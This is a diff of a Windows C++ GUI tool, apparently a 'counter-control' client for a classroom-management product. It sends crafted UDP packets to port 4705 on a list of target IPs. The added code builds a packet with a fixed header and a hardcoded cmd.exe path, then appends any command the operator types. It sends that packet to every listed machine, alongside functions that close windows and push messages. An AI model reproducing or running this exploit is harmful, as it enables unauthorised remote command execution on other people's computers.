@@ -11,6 +11,7 @@
 #include <ws2tcpip.h>
 #include <fstream>
 #include <atlconv.h> // CT2A
+#include <atlstr.h> // CString 支持（使用 ATL CString）
 
 #define MAX_LOADSTRING 100
 
@@ -44,22 +45,20 @@ INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
 INT_PTR CALLBACK AddIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 INT_PTR CALLBACK AddMultipleIPDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 INT_PTR CALLBACK SendMsgDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
+INT_PTR CALLBACK SendCmdDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
 
 bool CheckIP(const std::string& ip);
 bool CheckIPf(const std::string& ip);
 void AddIPs(const std::wstring& ip, const std::wstring& start, const std::wstring& end, HWND hDlg);// 添加多个IP地址
-wstring LoadFile(const wchar_t* filename); //主要用于读取README.txt文件内容
 wstring CMD_WStrToHex(const std::wstring& cmd);
 void WriteLogs(const std::string& logMessage);// 写入日志文件
 //反控全部函数
 void sendPacket(const wstring& targetIP, const string& hexData);
-void sendPacketW(const wstring& targetIP, const wstring& hexData);
 string generateHead();
-wstring generateHeadW();
 void closeWindow(const wstring& targetIP);
 string wstringToHex(const wstring& wstr);
 void send_myth_Message(const wstring& targetIP, const wstring& msg);
-
+string strToHex(const string& cmd);
 
 vector<wstring> ipList; // 存储IP地址的列表
 
@@ -164,7 +163,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
    //所有按键创建区域
    HWND closeWindow = CreateWindowW(L"BUTTON", L"关闭窗口", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 50, 50, 100, 50, hWnd, (HMENU)CLOSE_WINDOW, hInstance, nullptr);
    HWND sendMessage = CreateWindowW(L"BUTTON", L"发送消息", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 200, 50, 100, 50, hWnd, (HMENU)SEND_MESSAGE, hInstance, nullptr);
-   HWND sendCommand = CreateWindowW(L"BUTTON", L"发送cmd命令", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 350, 50, 100, 50, hWnd, (HMENU)SEND_MESSAGE, hInstance, nullptr);
+   HWND sendCommand = CreateWindowW(L"BUTTON", L"发送cmd命令", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 350, 50, 100, 50, hWnd, (HMENU)SEND_COMMAND, hInstance, nullptr);
    HWND AddIP = CreateWindowW(L"BUTTON", L"添加一个ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 200, 100, 25, hWnd, (HMENU)ADDIP, hInstance, nullptr);
    HWND AddIP2 = CreateWindowW(L"BUTTON", L"添加多个ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 240, 100, 25, hWnd, (HMENU)ADDIP2, hInstance, nullptr);
    HWND DelIP = CreateWindowW(L"BUTTON", L"删除选中ip", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 270, 280, 100, 25, hWnd, (HMENU)DELIP, hInstance, nullptr);
@@ -253,7 +252,10 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
                 DialogBox(hInst, MAKEINTRESOURCE(SENDMSG_WIN), hWnd, SendMsgDialog);
                 break;
             }
-
+            case SEND_COMMAND: {
+                DialogBox(hInst, MAKEINTRESOURCE(SENDCMD_WIN), hWnd, SendCmdDialog);
+                break;
+            }
             default:
                 return DefWindowProc(hWnd, message, wParam, lParam);
             }
@@ -283,25 +285,7 @@ bool CheckIP(const std::string& ip)
     return result == 1; // 返回true表示有效的IP地址
 }
 
-wstring LoadFile(const wchar_t* filename)
-{
-    // 以二进制方式读取 UTF-8 文件
-    ifstream file(filename, ios::binary);
-    if (!file.is_open()) return L"无法打开文件";
 
-    // 读取全部内容
-    string utf8Content((istreambuf_iterator<char>(file)),
-        istreambuf_iterator<char>());
-
-    // UTF-8 → UTF-16（宽字符） 使用 Windows API 替代已弃用的 std::wstring_convert
-    {
-        int size_needed = MultiByteToWideChar(CP_UTF8, 0, utf8Content.c_str(), -1, NULL, 0);
-        if (size_needed <= 0) return L"";
-        wstring wstr(size_needed - 1, L'\0');
-        MultiByteToWideChar(CP_UTF8, 0, utf8Content.c_str(), -1, &wstr[0], size_needed);
-        return wstr;
-    }
-}
 
 bool CheckIPf(const std::string& ip) 
 {
@@ -368,6 +352,17 @@ wstring CMD_WStrToHex(const std::wstring& cmd)
     return L"2f0063002000" + result;
 }
 
+string strToHex(const string& cmd) {
+    string result;
+    for (char c : cmd) {
+        char hex[3];
+        sprintf_s(hex, sizeof(hex), "%02x", (unsigned char)c);
+        result += hex;
+        result += "00";
+    }
+    return "2f0063002000" + result;
+}
+
 // 发送UDP数据包
 void sendPacket(const wstring& targetIP, const string& hexData) {
     WSADATA wsaData;
@@ -405,47 +400,13 @@ void sendPacket(const wstring& targetIP, const string& hexData) {
     WSACleanup();
 }
 
-void sendPacketW(const wstring& targetIP, const wstring& hexData) {
-	WSADATA wsaData;
-	WSAStartup(MAKEWORD(2, 2), &wsaData);
-	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	sockaddr_in targetAddr;
-	targetAddr.sin_family = AF_INET;
-	targetAddr.sin_port = htons(4705);
-	inet_pton(AF_INET, WideCharToUtf8(targetIP.c_str()).c_str(), &targetAddr.sin_addr);
-	vector<unsigned char> binaryData;
-	for (size_t i = 0; i < hexData.length(); i += 2) {
-		wstring byteStr = hexData.substr(i, 2);
-		unsigned char byte = (unsigned char)wcstol(byteStr.c_str(), nullptr, 16);
-		binaryData.push_back(byte);
-	}
-	int sent = sendto(sock, (const char*)binaryData.data(), binaryData.size(),
-		0, (sockaddr*)&targetAddr, sizeof(targetAddr));
-	if (sent != SOCKET_ERROR) {
-		//cout << "发送成功: " << targetIP << " (" << sent << "字节)" << endl;
-		MessageBoxW(NULL, L"发送成功!", L"提示", MB_OK | MB_ICONINFORMATION);
-		WriteLogs("successfully sent to " + WideCharToUtf8(targetIP.c_str()) + " (" + to_string(sent) + " bytes)");
-	}
-	else {
-		//cerr << "发送失败: " << targetIP << " 错误码:" <<  << endl;
-		MessageBoxW(NULL, L"发送失败!", L"提示", MB_OK | MB_ICONERROR);
-		WriteLogs("failed to send to " + WideCharToUtf8(targetIP.c_str()) + " error code: " + to_string(WSAGetLastError()));
-	}
-	closesocket(sock);
-	WSACleanup();
-}
+
 //随机头部生成函数
 string generateHead() {
     return "444d4f43000001006e030000" +
         to_string(dis(gen)) + to_string(dis(gen)) +
         "0000" +
         to_string(dis(gen)) + to_string(dis(gen)) + to_string(dis(gen));
-}
-wstring generateHeadW() {
-	return L"444d4f43000001006e030000" +
-		to_wstring(dis(gen)) + to_wstring(dis(gen)) +
-		L"0000" +
-		to_wstring(dis(gen)) + to_wstring(dis(gen)) + to_wstring(dis(gen));
 }
 
 // 关闭窗口函数
@@ -494,12 +455,43 @@ void send_myth_Message(const wstring& targetIP, const wstring& msg) {
 INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
 {
     UNREFERENCED_PARAMETER(lParam);
+    
     switch (message)
     {
     case WM_INITDIALOG:
     {
-        wstring text = LoadFile(L"README.txt");
-        SetDlgItemText(hDlg, EDIT_README, text.c_str());
+        HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_ATEXT1), L"ATEXT");
+        if (hRes == NULL) {
+            MessageBoxW(NULL, L"无法找到资源文件！", L"错误", MB_ICONERROR);
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)FALSE;
+        }
+
+        HGLOBAL hGlobal = LoadResource(NULL, hRes);
+        if (hGlobal == NULL) {
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)FALSE;
+        }
+
+        char* pText = (char*)LockResource(hGlobal);
+        DWORD dwSize = SizeofResource(NULL, hRes);
+
+        // 资源可能不是以 null 结尾，所以用 string 按大小拷贝数据
+        string s(pText, pText + dwSize);
+        // 先尝试按 UTF-8 解码为宽字符串，失败时回退到 ANSI (CP_ACP)
+        int wideLen = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)dwSize, NULL, 0);
+        wstring wstr;
+        if (wideLen > 0) {
+            wstr.resize(wideLen);
+            MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)dwSize, &wstr[0], wideLen);
+        } else {
+            wideLen = MultiByteToWideChar(CP_ACP, 0, s.data(), (int)dwSize, NULL, 0);
+            if (wideLen > 0) {
+                wstr.resize(wideLen);
+                MultiByteToWideChar(CP_ACP, 0, s.data(), (int)dwSize, &wstr[0], wideLen);
+            }
+        }
+        SetDlgItemTextW(hDlg, EDIT_README, wstr.c_str());
         return (INT_PTR)TRUE;
     }
     case WM_COMMAND:
@@ -604,12 +596,64 @@ INT_PTR CALLBACK SendMsgDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lP
     UNREFERENCED_PARAMETER(lParam);
     switch (message) {
     case WM_INITDIALOG: {
+        // 限制编辑框最多 1024 个字符
+        SendDlgItemMessage(hDlg, SENDMSG_WIN_EDIT, EM_SETLIMITTEXT, 1024, 0);
         return (INT_PTR)TRUE;
     }
     case WM_COMMAND: {
         switch (LOWORD(wParam)) {
-
+        case SENDMSG_WIN_CANCEL: {
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)TRUE;
+        }
+        case SENDMSG_WIN_OK: {
+            wchar_t msgBuffer[1025];
+            GetDlgItemText(hDlg, SENDMSG_WIN_EDIT, msgBuffer, 1025);
+            wstring messageToSend(msgBuffer);
+            for (const auto& ip : ipList) {
+                send_myth_Message(ip, messageToSend);
+            }
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)TRUE;
+        }
         }
     }
     }
+    return (INT_PTR)FALSE;
+}
+
+INT_PTR CALLBACK SendCmdDialog(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
+	UNREFERENCED_PARAMETER(lParam);
+	switch (message) {
+	case WM_INITDIALOG: {
+		// 限制编辑框最多 1024 个字符
+		SendDlgItemMessage(hDlg, SENDCMD_WIN_EDIT, EM_SETLIMITTEXT, 1024, 0);
+		return (INT_PTR)TRUE;
+	}
+	case WM_COMMAND: {
+		switch (LOWORD(wParam)) {
+		case SENDCMD_WIN_CANCEL: {
+			EndDialog(hDlg, LOWORD(wParam));
+			return (INT_PTR)TRUE;
+		}
+		case SENDCMD_WIN_OK: {
+			char cmdBuffer[1025];
+			GetDlgItemTextA(hDlg, SENDCMD_WIN_EDIT, cmdBuffer, 1025);
+			string commandToSend(cmdBuffer);// 获取用户输入的命令
+			string hexCommand = strToHex(commandToSend);
+            string head = generateHead();
+            string MsgHex = head + "000000000000000000204e0000c0a88e01610300006103000000020000000000000f0000000100000043003a005c00570069006e0064006f00770073005c00730079007300740065006d00330032005c0063006d0064002e006500780065000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" + hexCommand;
+            while (MsgHex.length() < 2076) {
+                MsgHex += "00";
+            }
+			for (const auto& ip : ipList) {
+				sendPacket(ip, MsgHex);
+			}
+			EndDialog(hDlg, LOWORD(wParam));
+			return (INT_PTR)TRUE;
+		}
+		}
+	}
+	}
+	return (INT_PTR)FALSE;
 }
